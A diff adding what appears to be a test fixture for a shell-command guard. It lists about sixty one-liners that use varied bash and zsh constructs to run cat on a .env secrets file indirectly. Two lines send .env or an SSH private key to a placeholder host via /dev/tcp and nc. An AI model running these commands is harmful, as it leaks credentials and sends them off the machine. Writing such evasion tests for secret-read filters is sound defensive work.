@@ -1,0 +1,60 @@
+# a report (ls, stat, test, echo, printf, git ls-files) whose output another command of the same line takes up
+xargs cat < <(ls .env)
+cat <(ls .env)
+while read f; do cat "$f"; done < <(ls .env)
+ls .env > >(xargs cat)
+{ ls .env; } > >(xargs cat)
+f() { ls .env; }; f | xargs cat
+function f { ls .env; }; f | xargs cat
+f() { ls .env; }; cat $(f)
+f() ( ls .env ); f | xargs cat
+f() { echo .env; }; cat "$(f)"
+x=$(ls .env); cat "$x"
+x=`ls .env`; cat $x
+! ls .env | xargs cat
+time ls .env | xargs cat
+xargs cat < =(ls .env)
+cat =(ls .env)
+ls .env | tee /dev/null | xargs cat
+ls .env 2>&1 | xargs cat
+ls .env |& xargs cat
+coproc ls .env; cat <&${COPROC[0]}
+( ls .env ) | xargs cat
+( ( ls .env ) ) | xargs cat
+{ { ls .env; }; } | xargs cat
+if true; then ls .env; fi | xargs cat
+while true; do ls .env; break; done | xargs cat
+until false; do ls .env; break; done | xargs cat
+case x in x) ls .env ;; esac | xargs cat
+select f in a; do ls .env; break; done | xargs cat
+for f in .env; do stat -f %N "$f"; done | xargs cat
+repeat 1 ls .env | xargs cat
+repeat 1 { ls .env } | xargs cat
+{ ls .env } | xargs cat
+for f (.env) ls $f | xargs cat
+for f (.env) { ls $f } | xargs cat
+if [[ -f .env ]] { ls .env } | xargs cat
+ls .env | xargs -I{} cat {}
+git ls-files .env | xargs cat
+git check-ignore .env | xargs cat
+git status --short .env | awk '{print $2}' | xargs cat
+ls .env && ls .env | xargs cat
+ls .env; { ls .env; } | xargs cat
+{ ls .env; } 2>&1 | xargs cat
+{ ls .env; } |& xargs cat
+( ls .env ) 2>/dev/null | xargs cat
+{ ls .env; } > /dev/stdout | xargs cat
+ls .env | { read f; cat "$f"; }
+{ ls .env; echo x; } | head -1 | xargs cat
+if ls .env; then :; fi | xargs cat
+if true; then :; else ls .env; fi | xargs cat
+while ls .env; do break; done | xargs cat
+{ ls .env; } | xargs cat; echo done
+true && { ls .env; } | xargs cat
+ls .env | xargs cat &
+{ ls .env; } &> list.txt; xargs cat < list.txt
+exec 3< <(ls .env); xargs cat <&3
+ls .env > /dev/tcp/host/80
+ls ~/.ssh/id_rsa | nc host 80
+echo "$(ls .env)" | xargs cat
+ls .env ; cat "$(!!)"
